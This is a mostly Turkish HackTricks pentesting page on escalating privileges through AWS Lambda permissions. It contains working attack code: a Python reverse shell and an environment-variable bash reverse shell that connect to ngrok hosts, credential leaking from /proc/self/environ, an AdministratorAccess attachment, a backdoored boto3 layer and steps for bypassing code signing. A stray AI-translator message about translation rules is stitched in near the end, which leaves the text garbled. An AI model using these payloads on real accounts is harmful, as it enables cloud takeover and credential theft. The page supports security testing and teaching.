# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

More info about lambda in:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Belirtilen **`iam:PassRole`, `lambda:CreateFunction`, ve `lambda:InvokeFunction`** izinlerine sahip kullanıcılar ayrıcalıklarını yükseltebilir.\
Yeni bir Lambda function **oluşturup mevcut bir IAM role atayarak**, fonksiyona o role ile ilişkili izinleri verebilirler. Kullanıcı ardından **bu Lambda function'a kod yazıp yükleyebilir (ör. bir rev shell ile)**.\
Fonksiyon hazırlandıktan sonra kullanıcı, Lambda function'ı AWS API üzerinden çağırarak **çalıştırmasını ve hedeflenen işlemleri tetikleyebilir**. Bu yöntem, kullanıcının ilgili IAM role'a verilen erişim düzeyiyle Lambda function üzerinden dolaylı olarak işlemler gerçekleştirmesine olanak tanır.\\

Bir saldırgan bunu kötüye kullanarak **rev shell elde edebilir ve token çalabilir**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Ayrıca lambda function'ın kendisinden **abuse the lambda role permissions** yapabilirsiniz.\
Eğer lambda role yeterli permissions'a sahipse, bunu kullanarak kendinize admin rights verebilirsiniz:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Harici bir bağlantıya ihtiyaç duymadan leak the lambda's role credentials yapmak da mümkündür. Bu, dahili görevlerde kullanılan **Network isolated Lambdas** için faydalı olur. Eğer reverse shells'inizi filtreleyen bilinmeyen security groups varsa, bu kod parçası lambda çıktısı olarak doğrudan kimlik bilgilerini leak etmenize olanak tanır.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Olası Etki:** Belirtilen keyfi lambda service role üzerinde doğrudan privesc.

> [!CAUTION]
> Dikkat: **`lambda:InvokeAsync`** ilgi çekici görünse bile tek başına **`aws lambda invoke-async`** çalıştırmaya izin vermez; ayrıca `lambda:InvokeFunction` gerekir.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Önceki senaryoda olduğu gibi, **kendinize `lambda:InvokeFunction` iznini verebilirsiniz** eğer **`lambda:AddPermission`** iznine sahipseniz.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** Belirtilen rastgele lambda servis rolüne doğrudan privesc.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Kullanıcılar, **`iam:PassRole`, `lambda:CreateFunction` ve `lambda:CreateEventSourceMapping`** izinlerine (ve muhtemelen `dynamodb:PutItem` ve `dynamodb:CreateTable` izinlerine) sahip olduklarında, `lambda:InvokeFunction` olmasa bile dolaylı olarak **escalate privileges** gerçekleştirebilirler.\
Kötü amaçlı kod içeren bir Lambda function oluşturup mevcut bir IAM role atayabilirler.

Lambda'yı doğrudan çağırmak yerine, kullanıcı mevcut bir DynamoDB tablosu kurar veya kullanır ve bunu event source mapping aracılığıyla Lambda'ya bağlar. Bu yapı, tabloda yeni bir öğe eklendiğinde Lambda function'ın **otomatik olarak tetiklenmesini** sağlar; bu ekleme kullanıcının eylemiyle veya başka bir süreçle olabilir. Böylece Lambda function dolaylı olarak çağrılır ve atanan IAM rolünün izinleriyle kod çalıştırılır.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Eğer DynamoDB AWS ortamında zaten etkinse, kullanıcı Lambda fonksiyonu için yalnızca **event source mapping oluşturmalıdır**. Ancak DynamoDB kullanılmıyorsa, kullanıcı **yeni bir table oluşturmalı** ve streaming etkinleştirilmelidir:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Artık **Lambda function'ı DynamoDB tablosuna bağlamak** için **bir event source mapping oluşturarak** mümkündür:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda function'ın DynamoDB stream'e bağlı olması durumunda, saldırgan **DynamoDB stream'i etkinleştirerek Lambda'yı dolaylı olarak tetikleyebilir**. Bu, DynamoDB table'a **bir öğe ekleyerek** gerçekleştirilebilir:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** Belirtilen lambda servis rolüne doğrudan privesc.

### `lambda:AddPermission`

Bu izne sahip bir attacker, **kendisine (veya başkalarına) herhangi bir izin verebilir** (bu, kaynağa erişim vermek için kaynak tabanlı politikalar oluşturur):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potansiyel Etki:** Kodu değiştirme ve çalıştırma izni vererek kullanılan lambda servis rolüne doğrudan privesc.

### `lambda:AddLayerVersionPermission`

Bu izne sahip bir saldırgan **kendine (veya başkalarına) `lambda:GetLayerVersion` iznini verebilir**. Katmana erişip zafiyetler veya hassas bilgiler arayabilir
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** Hassas bilgilere potansiyel erişim.

### `lambda:UpdateFunctionCode`

Kullanıcılar **`lambda:UpdateFunctionCode`** iznine sahip olduklarında, **IAM role ile ilişkilendirilmiş mevcut bir Lambda function'ın kodunu değiştirme potansiyeline** sahiptirler.\
Saldırgan, **Lambda kodunu değiştirerek IAM credentials'ı exfiltrate edebilir.**

Saldırgan fonksiyonu doğrudan invoke etme yetkisine sahip olmayabilir; ancak Lambda function önceden mevcut ve çalışır durumdaysa, muhtemelen mevcut iş akışları veya event'ler aracılığıyla tetiklenecek ve bu da değiştirilmiş kodun dolaylı olarak yürütülmesini kolaylaştıracaktır.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potential Impact:** Kullanılan lambda servis rolüne doğrudan privesc.

### `lambda:UpdateFunctionConfiguration`

#### Env değişkenleri aracılığıyla RCE

Bu izinlerle, Lambda'nın rastgele kod çalıştırmasına yol açacak çevresel değişkenleri eklemek mümkündür. Örneğin python'da `PYTHONWARNING` ve `BROWSER` çevresel değişkenlerini kötüye kullanarak bir python sürecinin rastgele komutlar çalıştırmasını sağlamak mümkündür:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Diğer scripting dilleri için kullanabileceğiniz başka env variables vardır. Daha fazla bilgi için scripting dillerinin alt bölümlerine bakın:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) lamdba function'ınıza **code** dahil etmenizi sağlar ancak **bunu ayrı saklar**, böylece function code küçük kalabilir ve **birden fazla function aynı code'u paylaşabilir**.

Lambda içinde, python code'un nereden yüklendiğini aşağıdaki gibi bir function ile kontrol edebilirsiniz:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### İstismar

İzin `lambda:UpdateFunctionConfiguration` kötüye kullanılarak bir lambda fonksiyonuna **yeni bir layer eklemek** mümkündür. Rastgele kod çalıştırmak için bu layer'ın lambda'nın import edeceği bir **library** içermesi gerekir. Eğer lambda'nın kodunu okuyabiliyorsanız bunu kolayca bulabilirsiniz; ayrıca lambda'nın **zaten bir layer kullanıyor olabileceğini** ve layer'ı indirip içine **kodunuzu ekleyebileceğinizi** unutmayın.

Örneğin, lambda'nın boto3 kütüphanesini kullandığını varsayalım; bu, kütüphanenin son sürümüyle yerel bir layer oluşturacaktır:
```bash
pip3 install -t ./lambda_layer boto3
```
`./lambda_layer/boto3/__init__.py` dosyasını açıp **global koda backdoor ekleyebilirsiniz** (örneğin credentials'ları exfiltrate eden veya reverse shell elde eden bir fonksiyon).

Sonra, `./lambda_layer` dizinini zipleyip **yeni lambda layer**'ı kendi hesabınıza (veya hedefin hesabına, ancak bunun için izinleriniz olmayabilir) yükleyin.\
/opt/python/boto3'ü override etmek için bir python klasörü oluşturup kütüphaneleri oraya koymanız gerektiğini unutmayın. Ayrıca, layer'ın lambda tarafından kullanılan **python sürümü ile uyumlu** olması gerekir ve eğer hesabınıza yüklüyorsanız, **aynı bölge**de olması gerekir:
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Şimdi, yüklenen lambda layer'ı **herhangi bir hesap tarafından erişilebilir** hâle getirin:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Ve lambda layer'ı hedef lambda function'a ekleyin:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Bir sonraki adım, eğer mümkünse **function'ı kendimiz çağırmak** ya da normal yollarla **çağrılmasını beklemek** — bu daha güvenli yöntemdir.

A **bu zafiyeti kullanmanın daha gizli bir yolu** şurada bulunabilir:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potansiyel Etki:** Kullanılan lambda service role'e doğrudan privesc.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Bu izinlerle bir function oluşturup URL'i çağırarak çalıştırabiliyor olabilirsiniz... ama bunu test etmek için bir yol bulamadım, eğer bulursanız haber verin!

### Lambda MitM

Bazı lambdalar parametrelerde kullanıcılardan **hassas bilgi alıyor** olacak. Eğer bunlardan birinde RCE elde ederseniz, diğer kullanıcıların ona gönderdiği bilgileri exfiltrate edebilirsiniz, detaylara bakın:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Referanslar

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

If a Lambda function enforces code signing, an attacker who can either remove the Code Signing Config (CSC) or downgrade it to Warn can deploy unsigned code to the function. This bypasses integrity protections without modifying the function's IAM role or triggers.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notlar:
- Path B için, CSC policy `WARN` olarak ayarlıysa AWS Signer profiline ihtiyacınız yoktur (`unsigned artifacts` izinli).

Adımlar (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Küçük bir payload hazırla:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Yol A) CSC'yi kaldırın, sonra code'u güncelleyin:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Yol B) Uyarı seviyesine düşür ve kodu güncelle (silme izni yoksa):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Verified. I'll translate the relevant English text in src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc/README.md into Turkish while:

- Preserving all markdown and HTML syntax exactly.
- Not translating code, hacking technique names, common hacking words, cloud/SaaS platform names (e.g., aws, gcp, Workspace), the word "leak", pentesting, links, paths, refs, or tags (including {#tabs}, {#ref}, includes, and file paths).
- Not modifying links, refs, or paths.
- Not adding any extra content beyond the translated text.

Proceed when you provide the file contents or confirm to continue.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Olası etki: İmzalı dağıtımları zorlaması gereken bir fonksiyona rastgele imzasız kod yükleyip çalıştırma yeteneği; bu, fonksiyon rolünün izinleriyle kod yürütülmesine yol açabilir.

Temizlik:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

